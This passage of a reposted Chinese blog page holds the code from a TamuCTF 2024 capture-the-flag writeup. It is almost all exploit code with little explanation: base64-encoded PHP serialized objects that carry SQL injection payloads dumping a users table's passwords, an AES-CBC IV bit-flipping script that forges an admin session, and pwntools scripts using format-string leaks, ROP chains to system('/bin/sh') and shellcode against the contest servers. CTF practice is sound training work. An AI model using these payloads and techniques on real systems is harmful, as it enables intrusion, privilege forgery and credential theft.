class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line">Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6Imd1ZXN0IjtzOjI6ImlkIjtzOjU3OiI5OTkndW5pb24gc2VsZWN0IChzZWxlY3Qgc3FsIGZyb20gc3FsaXRlX21hc3RlciksMiwzLDQtLSAiO3M6MTE6IgAqAHBhc3N3b3JkIjtzOjMyOiI1ZjRkY2MzYjVhYTc2NWQ2MWQ4MzI3ZGViODgyY2Y5OSI7czoxMDoiACoAcHJvZmlsZSI7Tjt9</span><br><span class="line">Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6Imd1ZXN0IjtzOjI6ImlkIjtzOjcwOiI5OTkndW5pb24gc2VsZWN0ICAoc2VsZWN0IGdyb3VwX2NvbmNhdChwYXNzd29yZCkgZnJvbSB1c2VycykgLDIsMyw0LS0gIjtzOjExOiIAKgBwYXNzd29yZCI7czozMjoiNWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTkiO3M6MTA6IgAqAHByb2ZpbGUiO047fQ==</span><br><span class="line">from os import environ</span><br><span class="line">from hashlib import md5</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Random import get_random_bytes</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from flask import Flask, request, make_response, Response</span><br><span class="line">from base64 import b64encode, b64decode</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">FLAG = environ[&#x27;FLAG&#x27;]</span><br><span class="line">PORT = int(environ[&#x27;PORT&#x27;])</span><br><span class="line"></span><br><span class="line">default_session = &#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;guest&quot;&#125;&#x27;</span><br><span class="line">key = get_random_bytes(AES.block_size)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def encrypt(session):</span><br><span class="line"> iv = get_random_bytes(AES.block_size)</span><br><span class="line"> cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"> return b64encode(iv + cipher.encrypt(pad(session.encode(&#x27;utf-8&#x27;), AES.block_size)))</span><br><span class="line"></span><br><span class="line">def decrypt(session):</span><br><span class="line"> raw = b64decode(session)</span><br><span class="line"> cipher = AES.new(key, AES.MODE_CBC, raw[:</span><br><span class="line">AES.block_size])</span><br><span class="line"> try:</span><br><span class="line"> return unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode()</span><br><span class="line"> </span><br><span class="line">except Exception:</span><br><span class="line"> return None</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line"> session = request.cookies.get(&#x27;session&#x27;)</span><br><span class="line"> if session == None:</span><br><span class="line"> res = Response(open(__file__).read(), mimetype=&#x27;text/plain&#x27;)</span><br><span class="line"> res.set_cookie(&#x27;session&#x27;, encrypt(default_session).decode())</span><br><span class="line"> return res</span><br><span class="line"> elif (plain_session := decrypt(session)) == default_session:</span><br><span class="line"> return Response(open(__file__).read(), mimetype=&#x27;text/plain&#x27;)</span><br><span class="line"> else:</span><br><span class="line"> if plain_session != None:</span><br><span class="line"> try:</span><br><span class="line"> if json.loads(plain_session)[&#x27;admin&#x27;] == True:</span><br><span class="line"> return FLAG</span><br><span class="line"> else:</span><br><span class="line"> return &#x27;You are not an administrator&#x27;</span><br><span class="line"> </span><br><span class="line">except Exception:</span><br><span class="line"> return &#x27;You are not an administrator&#x27;</span><br><span class="line"> else:</span><br><span class="line"> return &#x27;You are not an administrator&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"> app.run(&#x27;0.0.0.0&#x27;, PORT)</span><br><span class="line">&#123;&quot;admin&quot;: 0, &quot;us</span><br><span class="line">ername&quot;: &quot;guest&quot;</span><br><span class="line">&#125;</span><br><span class="line">def encrypt(session):</span><br><span class="line"> iv = get_random_bytes(AES.block_size)</span><br><span class="line"> cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"> return b64encode(iv + cipher.encrypt(pad(session.encode(&#x27;utf-8&#x27;), AES.block_size)))</span><br><span class="line">#-*- coding:</span><br><span class="line">utf8 -*-</span><br><span class="line">import base64</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">    #iv</span><br><span class="line">#&#123;&quot;admin&quot;: 0, &quot;us</span><br><span class="line">    #ername&quot;: &quot;guest&quot;</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(&quot;TNiZwJ1V0g85nLqM1jfOX1reKVgrHiKB0+bIGYVMheQzedUjeMPnLNurPIrXcu4oLpj9hv44MTY/81gPHaGYLg==&quot;)</span><br><span class="line">print(len(cipher))</span><br><span class="line"></span><br><span class="line">array_cipher = bytearray(cipher)</span><br><span class="line">iv = array_cipher[0:16]</span><br><span class="line">print(iv)</span><br><span class="line"></span><br><span class="line">decode_plain = &#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;guest&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">#原始明文</span><br><span class="line">plain = &#x27;&#123;&quot;admin&quot;: 1, &quot;us&#x27;</span><br><span class="line"></span><br><span class="line">newiv = list(iv)</span><br><span class="line"></span><br><span class="line">for i in range(0,16):</span><br><span class="line"> newiv[i] = (ord(plain[i].encode(&#x27;utf-8&#x27;)) ^ iv[i] ^ ord(decode_plain[i].encode(&#x27;utf-8&#x27;)))</span><br><span class="line"></span><br><span class="line">newiv = bytes(newiv)</span><br><span class="line"></span><br><span class="line">print(&#x27;newiv:&#x27;,base64.b64encode(newiv+cipher[16:]))</span><br><span class="line">from pwn import *</span><br><span class="line"> context.log_level=&quot;debug&quot;</span><br><span class="line"> def exp():</span><br><span class="line">    io = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;admin-panel&quot;)</span><br><span class="line">    io.recvuntil(b&quot;Login:n&quot;)</span><br><span class="line">    io.recvuntil(b&quot;length 16:n&quot;)</span><br><span class="line">    io.sendline(&quot;admin&quot;)</span><br><span class="line">    io.recvuntil(b&quot;length 24:n&quot;)</span><br><span class="line">    p = b&quot;secretpass123&quot;.ljust(0x20,b&quot;A&quot;) + b&quot;%15$p-%17$p&quot;</span><br><span class="line">    io.sendline(p)</span><br><span class="line">    io.recvuntil(&quot;adminn&quot;)</span><br><span class="line">    canary = int(io.recvuntil(b&quot;-&quot;,drop=True),16)</span><br><span class="line">    print(&quot;[+]canary:&quot;,hex(canary))</span><br><span class="line">    __libc_start_main = int(io.recv(14),16)-235</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">    libc_base = __libc_start_main - libc.sym[&#x27;__libc_start_main&#x27;]</span><br><span class="line">    print(&quot;[+]libc_base:&quot;,hex(libc_base))</span><br><span class="line">    sys_addr = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">    sh_addr = libc_base + next(libc.search(b&quot;/bin/shx00&quot;))</span><br><span class="line">    rdi_ret = libc_base + 0x23a5f</span><br><span class="line">    io.recvuntil(b&quot;1, 2 or 3:&quot;)</span><br><span class="line">    io.sendline(b&quot;2&quot;)</span><br><span class="line">    io.recvuntil(b&quot;went wrong:&quot;)</span><br><span class="line">    p = b&quot;A&quot;*0x48 + p64(canary) + b&quot;A&quot;*8 + p64(rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">    io.sendline(p)</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(b&quot;3&quot;)</span><br><span class="line">    io.recvuntil(b&quot;foundn&quot;)</span><br><span class="line">    io.sendline(b&quot;cat flag*&quot;)</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">from pwn import *</span><br><span class="line"> context.log_level=&quot;debug&quot;</span><br><span class="line"> def exp():</span><br><span class="line">    io = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;rift&quot;)</span><br><span class="line">    io.sendline(b&quot;%9$p-%11$p-%13$p.&quot;)</span><br><span class="line">    pie = int(io.recvuntil(b&quot;-&quot;,drop=True)[-14:],16) - 24 - elf.sym[&#x27;main&#x27;]</span><br><span class="line">    __libc_start_main = int(io.recvuntil(b&quot;-&quot;,drop=True),16) - 235</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">    libc_base = __libc_start_main - libc.sym[&#x27;__libc_start_main&#x27;]</span><br><span class="line">    print(&quot;[+]libc_base:&quot;,hex(libc_base))</span><br><span class="line">    sys_addr = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">    sh_addr = libc_base + next(libc.search(b&quot;/bin/shx00&quot;))</span><br><span class="line">    rbp = int(io.recv(14),16) - 0xf8</span><br><span class="line">    rdi_ret = pie + 0x127b</span><br><span class="line">    </span><br><span class="line">    def fmt(addr,data):</span><br><span class="line">        io.sendlineafter(b&quot;.n&quot;,f&quot;%&#123;(addr)&amp;0xffff&#125;c%13$hn.&quot;)</span><br><span class="line">        io.sendlineafter(b&quot;.n&quot;,f&quot;%&#123;(data)&amp;0xffff&#125;c%39$hn.&quot;)</span><br><span class="line">        io.sendlineafter(b&quot;.n&quot;,f&quot;%&#123;(addr+2)&amp;0xffff&#125;c%13$hn.&quot;)</span><br><span class="line">        io.sendlineafter(b&quot;.n&quot;,f&quot;%&#123;(data&gt;&gt;16)&amp;0xffff&#125;c%39$hn.&quot;)</span><br><span class="line">        io.sendlineafter(b&quot;.n&quot;,f&quot;%&#123;(addr+4)&amp;0xffff&#125;c%13$hn.&quot;)</span><br><span class="line">        io.sendlineafter(b&quot;.n&quot;,f&quot;%&#123;(data&gt;&gt;32)&amp;0xffff&#125;c%39$hn.&quot;)</span><br><span class="line"></span><br><span class="line">    fmt(rbp+0x8,rdi_ret)</span><br><span class="line">    fmt(rbp+0x10,sh_addr)</span><br><span class="line">    fmt(rbp+0x18,sys_addr)</span><br><span class="line">    io.sendlineafter(b&quot;.n&quot;,f&quot;%&#123;(rbp-4)&amp;0xffff&#125;c%13$hn.&quot;)</span><br><span class="line">    io.sendlineafter(b&quot;.n&quot;,f&quot;%39$hn&quot;)</span><br><span class="line">    io.sendline(b&quot;cat flag*&quot;)</span><br><span class="line">    io.recvall()</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">mov rdx,&#123;j&#125;</span><br><span class="line">xor dl,byte ptr [r8-0x1290+&#123;i&#125;]</span><br><span class="line">mov rax, 231</span><br><span class="line">mov rdi, rdx</span><br><span class="line">syscall</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;error&#x27;</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    error = []</span><br><span class="line">    for i in range(50):</span><br><span class="line">        for j in range(32,128):</span><br><span class="line">            print(f&quot;&#123;i&#125;-&#123;j&#125;:&quot;,flag)</span><br><span class="line">            io = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;confinement&quot;,timeout=8)</span><br><span class="line">            &#x27;&#x27;&#x27;</span><br><span class="line">                mov rdx,&#123;j&#125;</span><br><span class="line">                xor dl,byte ptr [r8-0x1290+&#123;i&#125;]</span><br><span class="line">                mov rax, 231  </span><br><span class="line">                mov rdi, rdx</span><br><span class="line">                syscall</span><br><span class="line">            &#x27;&#x27;&#x27;</span><br><span class="line">            p = b&quot;x48xC7xC2&quot;+p8(j)+b&quot;x00x00x00x41x32x90&quot;+p8(0x70+i)</span><br><span class="line">            p +=b&quot;xEDxFFxFFx48xC7xC0xE7x00x00x00x48x89xD7x0Fx05&quot;</span><br><span class="line">            io.sendline(p)</span><br><span class="line">            if b&quot;adios&quot; in io.recv():</span><br><span class="line">                flag+=chr(j)</span><br><span class="line">                break</span><br><span class="line">            io.close()</span><br><span class="line"></span><br><span class="line">        if flag[-1] == &#x27;&#125;&#x27;:</span><br><span class="line">            break</span><br><span class="line">              </span><br><span class="line">    print(flag)</span><br><span class="line">    </span><br><span class="line"> exp()</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">context.arch=&quot;amd64&quot;</span><br><span class="line">def exp():</span><br><span class="line">    io = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;five&quot;)</span><br><span class="line">    shellcode_x64=asm(shellcraft.amd64.sh())</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">      xchg rsi,rdx</span><br><span class="line">      syscall</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    io.send(p)</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(b&quot;x90&quot;*5+shellcode_x64)</span><br><span class="line">    io.sendline(b&quot;cat flag*&quot;)</span><br><span class="line">    io.recv()</span><br><span class="line">    </span><br><span class="line">exp()</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">io = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;resistant&quot;)</span><br><span class="line">io.sendline(b&#x27;N0tUrM0msP4sswd!&#x27;)</span><br><span class="line">io.recvall()</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/172434.html">https://www.ctfiot.com/172434.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/TamuCTF_2024_Writeup.full.md">CTF大赛WP集合&#x2F;articles&#x2F;TamuCTF_2024_Writeup.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/php-unserialize/">php-unserialize</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/01/ctf-kb/wp/Web/TFC_CTF_-_2024_WriteUp/" title="TFC CTF 2024 WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TFC CTF 2024 WriteUp</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/01/ctf-kb/wp/Web/The_Art_of_PHP_-_My_CTF_Journey_and_Untold_Stories/" title="The Art of PHP – My CTF Journey and Untold Stories! (Orange Tsai)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">The Art of PHP – My CTF Journey and Untold Stories! (Orange Tsai)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/01/01/ctf-kb/wp/Web/TCP1PCTF_2023_-_Un_Secure_-WEB/" title="TCP1PCTF 2023 – Un Secure [WEB]"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-01</div><div class="title">TCP1PCTF 2023 – Un Secure [WEB]</div></div></a></div><div><a href="/2025/01/01/ctf-kb/wp/Web/SUCTF_2025_Writeup/" title="SUCTF 2025 Writeup - XMCVE-Polaris"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-01</div><div class="title">SUCTF 2025 Writeup - XMCVE-Polaris</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">1.</span> <span class="toc-text">附图</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
